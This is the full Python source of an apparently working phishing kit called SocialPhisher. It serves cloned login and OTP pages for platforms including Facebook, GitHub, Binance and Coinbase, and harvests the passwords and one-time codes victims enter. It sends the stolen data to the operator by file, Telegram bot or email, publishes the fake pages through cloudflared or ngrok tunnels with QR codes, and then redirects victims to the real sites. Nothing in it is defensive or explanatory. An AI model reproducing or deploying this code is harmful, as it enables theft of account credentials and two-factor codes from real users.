#!/usr/bin/env python3

import os
import json
import datetime
import subprocess
import requests
import qrcode
from flask import Flask, request, render_template, redirect, session, jsonify
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.layout import Layout
from rich.panel import Panel
from rich.text import Text
from rich import box
import threading
import time
import socket
import select
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from jinja2 import FileSystemLoader
import re

console = Console()

class SocialPhisher:
    def __init__(self):
        # Paths & Setup
        self.templates_base = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        self.app = Flask(
            __name__,
            template_folder=self.templates_base,
            static_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static')
        )
        self.app.secret_key = os.urandom(24)  # For session management
        self.templates_dir = os.path.join(self.templates_base, 'social')
        self.output_dir = 'output/harvested'
        self.qr_dir = 'output/qrcodes'
        
        # Internal State
        self.harvested_data = []
        self.settings = {}
        self.selected_platform = None
        self.server_thread = None
        self.cloudflared_process = None
        self.ngrok_process = None
        self.use_otp = False

        # Register template directory for Flask
        self.app.jinja_loader = FileSystemLoader(self.templates_base)

        # Ensure directories exist
        self._ensure_directories()

        # Setup Flask routes
        self.setup_routes()

    def _ensure_directories(self):
        """Ensure required directories exist."""
        try:
            # Create main directories
            os.makedirs(self.templates_dir, exist_ok=True)
            os.makedirs(self.output_dir, exist_ok=True)
            os.makedirs(self.qr_dir, exist_ok=True)

            # Create platform-specific directories for all supported platforms
            platforms = [
                'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
                'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase'
            ]
            for platform in platforms:
                platform_dir = os.path.join(self.templates_dir, platform)
                os.makedirs(platform_dir, exist_ok=True)

                # Check if index.html exists
                index_file = os.path.join(platform_dir, 'index.html')
                if not os.path.exists(index_file):
                    console.print(f"[yellow]Warning: {index_file} template missing[/yellow]")

        except Exception as e:
            console.print(f"[red]Error creating directories: {str(e)}[/red]")
            raise

    def setup_routes(self):
        """Setup Flask routes."""
        @self.app.route('/')
        def index():
            # Get platform from query parameters
            platform = request.args.get('platform', '').lower().strip()
            template_type = request.args.get('type', 'index')

            # If no platform in URL but we have a selected one, use it
            if not platform and self.selected_platform:
                platform = self.selected_platform

            if not platform:
                platforms_list = [
                    'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
                    'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase'
                ]
                return render_template(
                    'social/error.html',
                    error="Select a Platform",
                    message="Available platforms: " + ", ".join(platforms_list)
                )

            try:
                # Clean platform name (remove special chars)
                platform = ''.join(c for c in platform if c.isalnum()).lower()
                
                # Construct and verify template path
                template_path = f'social/{platform}/{template_type}.html'
                full_path = os.path.join(self.templates_base, template_path)

                if not os.path.exists(full_path):
                    console.print(f"[red]Template not found: {full_path}[/red]")
                    return render_template(
                        'social/error.html',
                        error="Template Not Found",
                        message=f"The template for {platform.title()} is missing."
                    )

                # Set selected platform (template exists)
                self.selected_platform = platform

                # Render template
                return render_template(template_path, platform=platform)

            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return render_template(
                    'social/error.html',
                    error="Internal Server Error",
                    message=str(e)
                )

        @self.app.route('/social/<platform>/<template>', methods=['GET'])
        def serve_social_template(platform, template):
            """Serve specific social template pages."""
            try:
                # Handle both cases: with or without .html extension
                if not template.endswith('.html'):
                    template += '.html'

                template_path = f'social/{platform}/{template}'
                template_file = os.path.join(self.templates_base, template_path)
                if not os.path.exists(template_file):
                    return render_template(
                        'social/error.html',
                        error=f"Template '{template_path}' not found",
                        message="The requested template is not available."
                    )

                # Store the platform
                self.selected_platform = platform

                # Get user data from query parameters or session
                user_data = {
                    'email': request.args.get('email') or session.get('user_email', '')
                }

                # Render the template with user data
                return render_template(template_path, platform=platform, user_data=user_data)

            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return render_template(
                    'social/error.html',
                    error="Internal Server Error",
                    message=str(e)
                )

        @self.app.route('/login', methods=['POST'])
        def login():
            """Handle login form submissions."""
            platform = request.args.get('platform')
            if not platform:
                return jsonify({"error": "No platform specified"}), 400

            data = request.form.to_dict()
            data['platform'] = platform
            data['timestamp'] = datetime.datetime.now().isoformat()
            data['ip'] = request.remote_addr
            data['user_agent'] = request.headers.get('User-Agent')

            # Process the harvested data
            self.process_harvested_data(data, platform)

            # Get the email/username for displaying on OTP page
            user_identifier = data.get('email', data.get('username', data.get('login', '')))

            # Store in session
            session['user_email'] = user_identifier

            # Return OTP template info with user data
            return jsonify({
                'status': 'success',
                'require_otp': True,
                'otp_template': f'social/{platform}/otp.html',
                'user_data': {
                    'email': user_identifier
                }
            })

        @self.app.route('/verify', methods=['POST'])
        def verify():
            """Handle OTP verification submissions."""
            try:
                platform = request.args.get('platform', 'unknown')
                data = request.get_json() if request.is_json else request.form.to_dict()

                if not data:
                    return jsonify({'status': 'error', 'message': 'No data received'})

                data['platform'] = platform
                data['timestamp'] = datetime.datetime.now().isoformat()
                data['ip'] = request.remote_addr
                data['user_agent'] = request.headers.get('User-Agent')

                # Process the OTP data
                self.process_harvested_data(data, platform)

                # Redirect URL
                redirect_url = self.get_redirect_url(platform)

                return jsonify({
                    'status': 'success',
                    'redirect_url': redirect_url
                })

            except Exception as e:
                console.print(f"[red]Error processing OTP: {str(e)}[/red]")
                return jsonify({'status': 'error', 'message': str(e)})

    def get_redirect_url(self, platform):
        """Return the appropriate redirect URL for the given platform."""
        redirect_urls = {
            'github': 'https://github.com/login',
            'binance': 'https://accounts.binance.com/en/login',
            'telegram': 'https://web.telegram.org/',
            'linkedin': 'https://www.linkedin.com/login',
            'twitter': 'https://twitter.com/login',
            'tiktok': 'https://www.tiktok.com/login',
            'pinterest': 'https://www.pinterest.com/login',
            'reddit': 'https://www.reddit.com/login',
            'coinbase': 'https://www.coinbase.com/signin',
            'facebook': 'https://www.facebook.com/login',
            'instagram': 'https://www.instagram.com/login',
            'snapchat': 'https://accounts.snapchat.com/accounts/login'
        }
        return redirect_urls.get(platform.lower(), 'https://www.google.com')

    def process_harvested_data(self, data, platform):
        """Process and save harvested credentials."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Format the data based on type (login or OTP)
        if 'otp' in data:
            # OTP data
            message = f"""
[OTP] {platform.upper()} - {timestamp}
OTP Code: {data['otp']}
--------------------------------------------------
"""
            console.print(f"[green]✓ Received OTP from {platform.upper()}![/green]")
        else:
            # Login credentials
            email = data.get('email', data.get('username', data.get('login', '')))
            password = data.get('password', '')
            message = f"""
[LOGIN] {platform.upper()} - {timestamp}
Email/Username: {email}
Password: {password}
--------------------------------------------------
"""
            console.print(f"[green]✓ Received login credentials from {platform.upper()}![/green]")

        # Save to file
        self.save_to_file(message)
        console.print("[blue]→ Saved to file[/blue]")

        # Send to Telegram if configured
        if self.settings.get('output_method') == 'telegram' and self.settings.get('telegram_bot_token'):
            self.send_to_telegram(message)
            console.print("[blue]→ Sent to Telegram[/blue]")

        # Send via email if configured
        if self.settings.get('output_method') == 'email' and self.settings.get('email_address'):
            subject = f"{platform.upper()} {'OTP' if 'otp' in data else 'Credentials'} Captured"
            self.send_email_notification(subject, message)
            console.print("[blue]→ Sent to Email[/blue]")

        return {'status': 'success'}

    def save_to_file(self, data):
        """Save data to a local file."""
        filename = os.path.join('output', 'harvested', 'social_credentials.txt')
        os.makedirs(os.path.dirname(filename), exist_ok=True)

        with open(filename, 'a') as f:
            f.write(data)

    def send_to_telegram(self, message):
        """Send data to a Telegram bot."""
        bot_token = self.settings.get('telegram_bot_token')
        chat_id = self.settings.get('telegram_chat_id')

        if not bot_token or not chat_id:
            return

        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }

        try:
            requests.post(url, json=data)
        except Exception as e:
            console.print(f"[red]Failed to send to Telegram: {str(e)}[/red]")

    def send_email_notification(self, subject, body):
        """Send data via email."""
        smtp_server = self.settings.get('email_smtp_server')
        smtp_port = self.settings.get('email_smtp_port')
        email = self.settings.get('email_address')
        password = self.settings.get('email_password')
        notification_email = self.settings.get('notification_email')

        if not all([smtp_server, smtp_port, email, password, notification_email]):
            return

        try:
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = email
            msg['To'] = notification_email
            msg.attach(MIMEText(body, 'plain'))

            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
        except Exception as e:
            console.print(f"[red]Failed to send email: {str(e)}[/red]")

    def generate_qr_code(self, url, platform):
        """Generate and display a QR code for the phishing URL."""
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=2
        )
        qr.add_data(url)
        qr.make(fit=True)

        # Save QR code image
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.join(self.qr_dir, f'social_{platform}_{timestamp}.png')
        qr_image = qr.make_image(fill_color="black", back_color="white")
        qr_image.save(output_path, quality=95)

        console.print("\n[bold white]QR code saved and available at:[/bold white]")
        console.print(f"[green]{output_path}[/green]\n")

        # Display a mini QR code in terminal
        console.print("\n[bold cyan]╭─[bright_yellow] Mini QR Code [/bright_yellow]─╮[/bold cyan]")
        mini_qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=1,
            border=1
        )
        mini_qr.add_data(url)
        mini_qr.make(fit=True)

        matrix = mini_qr.get_matrix()

        # Combine rows using half-block characters
        for i in range(0, len(matrix), 2):
            line = "[bold cyan]│[/bold cyan] "
            for j in range(len(matrix[i])):
                top = matrix[i][j]
                bottom = matrix[i + 1][j] if i + 1 < len(matrix) else False
                if top and bottom:
                    line += "[bright_white]█[/bright_white]"
                elif top:
                    line += "[bright_white]▀[/bright_white]"
                elif bottom:
                    line += "[bright_white]▄[/bright_white]"
                else:
                    line += "[black] [/black]"
            line += " [bold cyan]│[/bold cyan]"
            console.print(line)

        console.print("[bold cyan]╰" + "─" * (len(matrix) + 2) + "╯[/bold cyan]")
        console.print("[dim]Scan with your phone's camera[/dim]\n")

    def start_server(self, host='0.0.0.0', port=8080):
        """Start the Flask server."""
        try:
            # Ensure port is free
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((host, port))
                s.close()

            console.print(f"[green]Starting server on {host}:{port}...[/green]")
            self.app.run(host=host, port=port, debug=False)
        except Exception as e:
            console.print(f"[red]Failed to start server: {str(e)}[/red]")
            raise e

    def monitor_connection(self, tunnel_type):
        """Monitor tunnel connection and show status."""
        try:
            if tunnel_type == "cloudflared":
                if self.cloudflared_process and self.cloudflared_process.poll() is None:
                    console.print("[green]Tunnel Status: ● Connected[/green]")
                else:
                    console.print("[red]Tunnel Status: ● Disconnected[/red]")
                    return
            else:  # ngrok
                try:
                    requests.get('http://127.0.0.1:4040/api/tunnels')
                    console.print("[green]Tunnel Status: ● Connected[/green]")
                except:
                    console.print("[red]Tunnel Status: ● Disconnected[/red]")
                    return

            console.print("\n[bold yellow]Waiting for victim's information...[/bold yellow]")
            console.print("[dim]Press Ctrl+C to stop the server[/dim]\n")

            # Keep checking the tunnel status
            while True:
                if tunnel_type == "cloudflared":
                    if self.cloudflared_process.poll() is not None:
                        console.print("[red]Tunnel disconnected![/red]")
                        break
                else:
                    try:
                        requests.get('http://127.0.0.1:4040/api/tunnels')
                    except:
                        console.print("[red]Tunnel disconnected![/red]")
                        break
                time.sleep(1)

        except Exception as e:
            console.print(f"[red]Error monitoring connection: {str(e)}[/red]")

    def start_cloudflared(self, port, platform, platform_module=None):
        """Start a Cloudflared tunnel."""
        try:
            console.print("[yellow]Initializing cloudflared tunnel...[/yellow]")

            # Use provided platform module or import it
            if platform_module is None:
                import platform as platform_module

            # Windows-specific cleanup
            if platform_module.system() == "Windows":
                try:
                    subprocess.run('taskkill /F /IM cloudflared.exe 2>nul', shell=True, stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Windows cleanup: {str(e)}[/yellow]")
            else:
                try:
                    subprocess.run(['pkill', '-9', 'cloudflared'], stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Unix cleanup: {str(e)}[/yellow]")

            time.sleep(2)

            # Check if cloudflared is installed
            try:
                version_check = subprocess.run(
                    ['cloudflared', '--version'],
                    capture_output=True,
                    text=True
                )
                console.print(f"[green]Using Cloudflared version: {version_check.stdout.strip()}[/green]")
            except FileNotFoundError:
                console.print("[yellow]Cloudflared not found. Attempting to install...[/yellow]")
                try:
                    if platform_module.system() == "Windows":
                        # Download Windows binary
                        console.print("[yellow]Downloading cloudflared for Windows...[/yellow]")
                        download_url = (
                            "https://github.com/cloudflare/cloudflared/releases/latest/download/"
                            "cloudflared-windows-amd64.exe"
                        )
                        import urllib.request
                        try:
                            urllib.request.urlretrieve(download_url, 'cloudflared.exe')
                        except Exception as e:
                            console.print(f"[red]Failed to download cloudflared: {str(e)}[/red]")
                            return False
                        os.environ['PATH'] = f"{os.getcwd()};{os.environ['PATH']}"
                    elif os.path.exists('/usr/bin/apt'):
                        subprocess.run(['sudo', 'apt', 'update'], check=True)
                        subprocess.run(['sudo', 'apt', 'install', '-y', 'cloudflared'], check=True)
                    elif os.path.exists('/data/data/com.termux/files/usr/bin/pkg'):
                        subprocess.run(['pkg', 'update'], check=True)
                        subprocess.run(['pkg', 'install', '-y', 'cloudflared'], check=True)
                    else:
                        console.print("[yellow]Downloading cloudflared binary...[/yellow]")
                        subprocess.run([
                            'curl', '-Lo', './cloudflared',
                            'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
                        ], check=True)
                        os.chmod('./cloudflared', 0o755)
                        os.environ['PATH'] = f"{os.getcwd()}:{os.environ['PATH']}"
                except Exception as e:
                    console.print(f"[red]Failed to install cloudflared: {str(e)}[/red]")
                    return False

            # Start cloudflared tunnel
            try:
                if platform_module.system() == "Windows":
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    self.cloudflared_process = subprocess.Popen(
                        ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        startupinfo=startupinfo,
                        text=True,
                        bufsize=1,
                        universal_newlines=True
                    )
                else:
                    self.cloudflared_process = subprocess.Popen(
                        ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        bufsize=1,
                        universal_newlines=True
                    )

                start_time = time.time()
                timeout = 30
                url_found = False
                error_count = 0
                max_errors = 3

                console.print("[yellow]Waiting for tunnel to be established...[/yellow]")

                while (time.time() - start_time) < timeout and not url_found and error_count < max_errors:
                    # Check if cloudflared has exited
                    if self.cloudflared_process.poll() is not None:
                        error = (
                            self.cloudflared_process.stderr.read().strip()
                            if self.cloudflared_process.stderr
                            else "Unknown error"
                        )
                        console.print(f"[red]Cloudflared process terminated unexpectedly: {error}[/red]")
                        return False

                    # Read from both stdout and stderr
                    if hasattr(select, 'select'):  # Unix
                        ready_pipes, _, _ = select.select(
                            [self.cloudflared_process.stdout, self.cloudflared_process.stderr],
                            [], [], 0.1
                        )
                    else:  # Windows fallback
                        ready_pipes = [self.cloudflared_process.stdout]
                        time.sleep(0.1)

                    for pipe in ready_pipes:
                        try:
                            line = pipe.readline().strip()
                            if line:
                                if "trycloudflare.com" in line:
                                    url_match = re.search(r'https?://[^\s|\]]+\.trycloudflare\.com', line)
                                    if url_match:
                                        base_url = url_match.group(0)
                                        url = f"{base_url}/?platform={platform}"
                                        console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                        console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
                                        console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                                        self.generate_qr_code(url, platform)
                                        url_found = True
                                        break
                                elif "error" in line.lower():
                                    error_count += 1
                                    console.print(f"[yellow]Warning: {line}[/yellow]")
                        except Exception as e:
                            error_count += 1
                            if error_count >= max_errors:
                                console.print(f"[red]Error reading cloudflared output: {str(e)}[/red]")

                if not url_found:
                    console.print("[red]Failed to get tunnel URL within timeout period[/red]")
                    return False

                # Start monitoring thread
                monitor_thread = threading.Thread(target=self.monitor_connection, args=("cloudflared",))
                monitor_thread.daemon = True
                monitor_thread.start()

                console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                return True

            except Exception as e:
                console.print(f"[red]Error starting cloudflared tunnel: {str(e)}[/red]")
                return False

        except Exception as e:
            console.print(f"[red]Error in cloudflared setup: {str(e)}[/red]")
            return False

    def configure_ngrok(self):
        """Configure ngrok with the saved token, if available."""
        if self.settings.get('ngrok_token'):
            try:
                subprocess.run(
                    ['ngrok', 'config', 'add-authtoken', self.settings['ngrok_token']],
                    capture_output=True,
                    text=True
                )
                console.print("[green]Ngrok configured with saved token[/green]")
                return True
            except Exception as e:
                console.print(f"[red]Error configuring ngrok: {str(e)}[/red]")
                return False
        return False

    def start_ngrok(self, port, platform, platform_module=None):
        """Start an ngrok tunnel."""
        try:
            console.print("[yellow]Initializing ngrok tunnel...[/yellow]")

            if platform_module is None:
                import platform as platform_module

            # Configure ngrok if possible
            if not self.configure_ngrok():
                console.print("[yellow]Skipping ngrok configuration; token not provided or config failed.[/yellow]")

            # Windows-specific cleanup
            if platform_module.system() == "Windows":
                try:
                    subprocess.run('taskkill /F /IM ngrok.exe 2>nul', shell=True, stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Windows cleanup: {str(e)}[/yellow]")
            else:
                try:
                    subprocess.run(['pkill', '-9', 'ngrok'], stderr=subprocess.DEVNULL)
                except Exception as e:
                    console.print(f"[yellow]Warning during Unix cleanup: {str(e)}[/yellow]")

            time.sleep(2)

            # Check if ngrok is installed
            try:
                version_check = subprocess.run(['ngrok', 'version'], capture_output=True, text=True)
                console.print(f"[green]Using ngrok version: {version_check.stdout.strip()}[/green]")
            except FileNotFoundError:
                console.print("[yellow]ngrok not found. Attempting to install...[/yellow]")
                try:
                    if platform_module.system() == "Windows":
                        console.print("[yellow]Downloading ngrok for Windows...[/yellow]")
                        download_url = (
                            "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
                        )
                        import urllib.request
                        import zipfile
                        try:
                            urllib.request.urlretrieve(download_url, 'ngrok.zip')
                            with zipfile.ZipFile('ngrok.zip', 'r') as zip_ref:
                                zip_ref.extractall('.')
                            os.remove('ngrok.zip')
                        except Exception as e:
                            console.print(f"[red]Failed to download ngrok: {str(e)}[/red]")
                            return False
                        os.environ['PATH'] = f"{os.getcwd()};{os.environ['PATH']}"
                    elif os.path.exists('/usr/bin/apt'):
                        subprocess.run(['sudo', 'apt', 'update'], check=True)
                        subprocess.run(['sudo', 'apt', 'install', '-y', 'ngrok'], check=True)
                    elif os.path.exists('/data/data/com.termux/files/usr/bin/pkg'):
                        subprocess.run(['pkg', 'update'], check=True)
                        subprocess.run(['pkg', 'install', '-y', 'ngrok'], check=True)
                    else:
                        console.print("[yellow]Downloading ngrok binary...[/yellow]")
                        subprocess.run([
                            'curl', '-Lo', './ngrok.zip',
                            'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip'
                        ], check=True)
                        subprocess.run(['unzip', '-o', 'ngrok.zip'], check=True)
                        os.remove('ngrok.zip')
                        os.chmod('./ngrok', 0o755)
                        os.environ['PATH'] = f"{os.getcwd()}:{os.environ['PATH']}"
                except Exception as e:
                    console.print(f"[red]Failed to install ngrok: {str(e)}[/red]")
                    return False

            # Start ngrok tunnel
            try:
                if platform_module.system() == "Windows":
                    self.ngrok_process = subprocess.Popen(
                        ['ngrok', 'http', str(port)],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                else:
                    self.ngrok_process = subprocess.Popen(
                        ['ngrok', 'http', str(port)],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )

                time.sleep(3)
                if self.ngrok_process.poll() is not None:
                    console.print("[red]Failed to start ngrok tunnel[/red]")
                    return False

                # Query the ngrok API for the public URL
                try:
                    response = requests.get('http://127.0.0.1:4040/api/tunnels')
                    if response.status_code == 200:
                        tunnels = response.json().get('tunnels', [])
                        if tunnels:
                            url = tunnels[0].get('public_url')
                            if url:
                                url = f"{url}?platform={platform}"
                                console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
                                console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
                                self.generate_qr_code(url, platform)

                                monitor_thread = threading.Thread(target=self.monitor_connection, args=("ngrok",))
                                monitor_thread.daemon = True
                                monitor_thread.start()

                                console.print("\n[bold yellow]Server is running. Waiting for victims...[/bold yellow]")
                                console.print("[bold yellow]Press Ctrl+C to stop the server[/bold yellow]\n")
                                return True
                except Exception as e:
                    console.print(f"[red]Error getting ngrok URL: {str(e)}[/red]")
                    return False

                console.print("[red]Failed to get ngrok tunnel URL[/red]")
                return False

            except Exception as e:
                console.print(f"[red]Error starting ngrok tunnel: {str(e)}[/red]")
                return False

        except Exception as e:
            console.print(f"[red]Error in ngrok setup: {str(e)}[/red]")
            return False

    def stop_tunnels(self):
        """Stop all running tunnels."""
        if self.cloudflared_process:
            self.cloudflared_process.terminate()
            self.cloudflared_process = None
        if self.ngrok_process:
            self.ngrok_process.terminate()
            self.ngrok_process = None

    def load_settings(self):
        """Load settings from configuration file."""
        try:
            config_file = os.path.join('config', 'landing_settings.json')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.settings = json.load(f)
                console.print("[green]Settings loaded successfully[/green]")
            else:
                console.print("[yellow]No settings file found, using defaults[/yellow]")
                self.settings = {
                    'output_method': 'file',
                    'output_file': os.path.join('output', 'harvested', 'social_credentials.txt')
                }
        except Exception as e:
            console.print(f"[red]Error loading settings: {str(e)}[/red]")
            self.settings = {
                'output_method': 'file',
                'output_file': os.path.join('output', 'harvested', 'social_credentials.txt')
            }

    def configure_output(self):
        """Configure output methods based on loaded settings."""
        output_method = self.settings.get('output_method', 'file')

        if output_method == 'telegram':
            if not (self.settings.get('telegram_bot_token') and self.settings.get('telegram_chat_id')):
                console.print("[yellow]Telegram settings incomplete, falling back to file output[/yellow]")
                self.settings['output_method'] = 'file'
            else:
                console.print("[green]Telegram output configured[/green]")

        elif output_method == 'email':
            required = [
                'email_smtp_server', 'email_smtp_port',
                'email_address', 'email_password', 'notification_email'
            ]
            if not all(self.settings.get(field) for field in required):
                console.print("[yellow]Email settings incomplete, falling back to file output[/yellow]")
                self.settings['output_method'] = 'file'
            else:
                console.print("[green]Email output configured[/green]")

        console.print(f"[blue]Output method: {self.settings['output_method']}[/blue]")

    def _wait_for_server(self, port, timeout=10):
        """Wait for the server to start listening on the given port."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(('localhost', port))
                    return True
            except:
                time.sleep(0.1)
        return False

    def _find_available_port(self, start_port=8080, max_attempts=100):
        """Find an available port starting from a given port."""
        port = start_port
        while port < start_port + max_attempts:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('', port))
                    return port
            except OSError:
                port += 1
        raise RuntimeError("No available ports found")

    def run(self):
        """Run the social phishing module."""
        try:
            # Load settings
            self.load_settings()

            # Print platforms in a 2-column table
            table = Table(
                title="[bold red]Available Social Media Platforms[/bold red]",
                show_header=True,
                header_style="bold magenta",
                box=box.DOUBLE_EDGE,
                border_style="bright_green",
                padding=(1, 2)
            )
            table.add_column("[cyan]ID[/cyan]", style="cyan", justify="center", width=6)
            table.add_column("[green]Platform[/green]", style="green", width=20)
            table.add_column("[cyan]ID[/cyan]", style="cyan", justify="center", width=6)
            table.add_column("[green]Platform[/green]", style="green", width=20)

            platforms = [
                ("1", "Facebook", "7", "Binance"),
                ("2", "Instagram", "8", "Telegram"),
                ("3", "Twitter",   "9", "Pinterest"),
                ("4", "TikTok",    "10", "Reddit"),
                ("5", "Snapchat",  "11", "Coinbase"),
                ("6", "GitHub",    "12", "LinkedIn")
            ]
            for row in platforms:
                table.add_row(
                    f"[bold cyan]{row[0]}[/bold cyan]", f"[bright_green]{row[1]}[/bright_green]",
                    f"[bold cyan]{row[2]}[/bold cyan]", f"[bright_green]{row[3]}[/bright_green]"
                )

            panel = Panel(
                table,
                title="[bold yellow]≫ Select Your Target ≪[/bold yellow]",
                border_style="bright_green",
                box=box.HEAVY_EDGE,
                padding=(1, 2)
            )

            console.print("\n")
            console.print(panel)
            console.print("\n")

            # Prompt user for platform choice
            while True:
                try:
                    choice = Prompt.ask(
                        "[bold green]Select platform ID[/bold green]",
                        choices=[str(i) for i in range(1, 13)],
                        show_choices=False
                    )
                    break
                except KeyboardInterrupt:
                    raise
                except Exception:
                    console.print("[red]Invalid choice. Please enter a number between 1 and 12.[/red]")

            platform_map = {
                "1": "facebook",
                "2": "instagram",
                "3": "twitter",
                "4": "tiktok",
                "5": "snapchat",
                "6": "github",
                "7": "binance",
                "8": "telegram",
                "9": "pinterest",
                "10": "reddit",
                "11": "coinbase",
                "12": "linkedin"
            }
            self.selected_platform = platform_map[choice]
            console.print(f"\n[bold green]Selected platform: {self.selected_platform.upper()}[/bold green]")

            # Verify template directory
            template_dir = os.path.join(self.templates_dir, self.selected_platform)
            if not os.path.exists(template_dir):
                console.print(f"[red]Error: Template directory for {self.selected_platform} not found![/red]")
                return

            # Check for optional OTP template
            otp_template = os.path.join(template_dir, 'otp.html')
            if os.path.exists(otp_template):
                use_otp = Prompt.ask("Enable OTP verification?", choices=["y", "n"], default="n")
                self.use_otp = (use_otp.lower() == "y")
                if self.use_otp:
                    console.print("[green]OTP verification enabled[/green]")

            # Find available port
            port = self._find_available_port()
            if not port:
                console.print("[red]Error: No available ports found![/red]")
                return
            console.print(f"[green]Found available port: {port}[/green]")

            # Start Flask server in a separate thread
            server_thread = threading.Thread(
                target=self.start_server,
                kwargs={'port': port}
            )
            server_thread.daemon = True
            server_thread.start()

            # Wait for the server to be ready
            if not self._wait_for_server(port):
                console.print("[red]Failed to start server[/red]")
                return
            console.print(f"[green]Server started successfully on port {port}[/green]")

            # Tunneling options
            tunnel_table = Table(title="Tunneling Services", show_header=True, header_style="bold magenta")
            tunnel_table.add_column("ID", style="cyan", justify="center")
            tunnel_table.add_column("Service", style="green")
            tunnel_table.add_row("1", "Cloudflared")
            tunnel_table.add_row("2", "Ngrok")
            console.print(tunnel_table)

            tunnel_choice = Prompt.ask(
                "\nChoose tunnel service",
                choices=["1", "2"],
                default="1"
            )

            # Start tunnel
            if tunnel_choice == "1":
                if not self.start_cloudflared(port, self.selected_platform):
                    console.print("[red]Failed to start Cloudflared tunnel[/red]")
                    return
            else:
                if not self.start_ngrok(port, self.selected_platform):
                    console.print("[red]Failed to start Ngrok tunnel[/red]")
                    return

            # Keep the script running until Ctrl+C
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]Stopping server...[/yellow]")
                self.stop_tunnels()
                console.print("[green]Server stopped successfully[/green]")

        except KeyboardInterrupt:
            console.print("\n[yellow]Operation cancelled by user[/yellow]")
            self.stop_tunnels()
        except Exception as e:
            console.print(f"[red]An error occurred: {str(e)}[/red]")
            self.stop_tunnels()
